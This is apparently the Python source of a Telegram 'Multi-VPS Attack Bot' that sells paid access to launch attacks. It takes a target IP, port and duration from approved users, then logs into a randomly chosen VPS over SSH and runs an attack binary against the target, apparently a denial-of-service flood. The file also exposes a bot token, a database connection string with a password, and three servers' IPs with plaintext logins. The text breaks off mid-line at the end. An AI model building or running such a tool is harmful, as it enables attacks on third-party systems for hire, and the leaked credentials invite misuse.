import os
import telebot
import logging
import time
import paramiko
import certifi
import asyncio
import random
from flask import Flask, request
from pymongo import MongoClient
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

TOKEN = '8013938312:AAH2wgu1Gsw29Lo5orDamDs3crFmJlHZYGE'
MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
CHANNEL_ID = -1002519522549
WEBHOOK_HOST = '<https://3196-70-34-255-232.ngrok-free.app>'  # Replace with your actual Ngrok HTTPS link
WEBHOOK_URL_PATH = "/" + TOKEN
WEBHOOK_URL = WEBHOOK_HOST + WEBHOOK_URL_PATH

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['rishi']
users_collection = db.users

REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
last_attack_time = {}

VPS_LIST = [
    {"ip": "155.138.136.219", "user": "master_ngmatkuyvr", "password": "98Cf7KqktBBs"},
    {"ip": "70.34.255.232", "user": "master_kvrbezzhav", "password": "seCR2Wn4YYhK"},
    {"ip": "70.34.255.101", "user": "master_fptcarnpqt", "password": "jFtHtZf6swW4"}
]

async def run_attack_command_on_remote(target_ip, target_port, duration):
    vps = random.choice(VPS_LIST)
    command = f"./swarg {target_ip} {target_port} {duration}"
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["password"])
        ssh.exec_command(command)
        ssh.close()
        logging.info(f"Executed on {vps['ip']}: {command}")
    except Exception as e:
        logging.error(f"SSH Attack failed: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    await run_attack_command_on_remote(target_ip, target_port, duration)

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    return bool(user_data and user_data['plan'] > 0)

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACCESS*", parse_mode='Markdown')

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    current_time = time.time()
    if user_id in last_attack_time:
        time_diff = current_time - last_attack_time[user_id]
        if time_diff < 265.78:
            wait_time = 265.78 - time_diff
            bot.send_message(chat_id, f"⏳ Please wait {wait_time:.2f} seconds before next attack.", parse_mode='Markdown')
            return

    bot.send_message(chat_id, "*Send: <IP> <PORT> <TIME>*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_command)

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid Format. Use /Attack to retry.*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, "*Blocked Port. Try another.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack Sent to: {target_ip}:{target_port} for {duration}s*", parse_mode='Markdown')
        last_attack_time[message.from_user.id] = time.time()

    except Exception as e:
        logging.error(f"Attack error: {e}")

@bot.message_handler(commands=['start'])
def welcome_message(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(KeyboardButton("🚀Attack"), KeyboardButton("ℹ️ My Info"))
    bot.send_message(message.chat.id, "*Welcome to Multi-VPS Attack Bot!*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "🚀Attack")
def attack_button(message):
    attack_command(message)

@bot.message_handler(func=lambda m: m.text == "ℹ️ My Info")
def user_info(message):
    user_data = users_collection.find_one({"user_id": message.from_user.id})
    if user_data:
        info = f"*Plan:* {user_data.get('plan')}\n*Valid Until:* {user_data.get('valid_until')}"
    else:
        info = "*No user info found.*"
    bot.send_message(message.chat.id,_
    